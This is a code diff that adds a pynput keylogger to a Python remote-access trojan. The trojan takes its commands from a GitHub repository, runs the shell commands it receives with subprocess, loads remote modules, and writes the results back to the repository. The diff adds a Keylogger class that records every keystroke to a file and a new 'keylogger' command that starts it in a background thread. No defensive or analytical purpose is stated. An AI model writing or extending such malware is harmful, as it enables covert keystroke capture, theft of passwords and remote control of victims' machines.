@@ -9,6 +9,7 @@ import time
 import subprocess
 import requests
 from datetime import datetime
+from pynput import keyboard  # Added for keylogger
 
 def github_connect():
     with open('secret.txt') as f:
@@ -19,6 +20,23 @@ def github_connect():
 
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
+
+# Keylogger functionality
+class Keylogger:
+    def __init__(self, log_file="keylog.txt"):
+        self.log_file = log_file
+
+    def on_press(self, key):
+        try:
+            with open(self.log_file, "a") as f:
+                f.write(key.char)
+        except AttributeError:
+            with open(self.log_file, "a") as f:
+                f.write(f"[{key}]")
+
+    def run(self):
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
 
 class Trojan:
     def __init__(self, id, node_server_url):
@@ -33,7 +51,6 @@ class Trojan:
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             decoded_config = base64.b64decode(config_json).decode('utf-8')
-            # print(f"Decoded config JSON: {decoded_config}")  # Debug output
             return json.loads(decoded_config)
         except Exception as e:
             print(f"Error fetching GitHub config: {e}")
@@ -83,13 +100,13 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
-                        print(f"[*] Executing command: {shell_command}")  # Debug output
+                        print(f"[*] Executing command: {shell_command}")
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
                     self.send_command_result(shell_command, result)
-                    self.store_shell_command_result(shell_command, result)  # Store result in GitHub
+                    self.store_shell_command_result(shell_command, result)
             elif command_type == 'module':
                 module_name = command.get('module')
                 if module_name:
@@ -97,6 +114,8 @@ class Trojan:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
+            elif command_type == 'keylogger':  # Added keylogger command handling
+                self.start_keylogger()
         else:
             print(f"Invalid command format: {command}")
 
@@ -109,6 +128,12 @@ class Trojan:
         remote_path = f'data/{self.id}/{message}.data'
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
+
+    def start_keylogger(self):
+        keylogger = Keylogger()
+        keylogger_thread = threading.Thread(target=keylogger.run)
+        keylogger_thread.start()
+        print("[*] Keylogger started.")  # Debug output
 
     def run(self):
         while self.running:
